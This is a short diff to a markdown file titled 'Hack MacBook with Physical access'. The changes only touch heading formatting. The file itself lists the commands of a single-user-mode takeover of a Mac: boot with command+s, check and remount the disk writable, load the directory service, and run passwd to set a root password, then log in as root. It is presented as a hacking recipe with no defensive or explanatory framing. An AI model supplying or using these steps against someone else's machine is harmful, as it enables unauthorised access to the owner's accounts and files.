@@ -1,9 +1,9 @@
-#Hack MacBook with Physical access
+#Hack MacBook with Physical access##
 
-##Reboot
+##Reboot##
 ```command+s```
 ```/sbin/fsck -fy```
 ```/sbin/mount -uw/```
 ```launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist```
 ```passwd```
-##Login as root using new Password
+##Login as root using new Password##
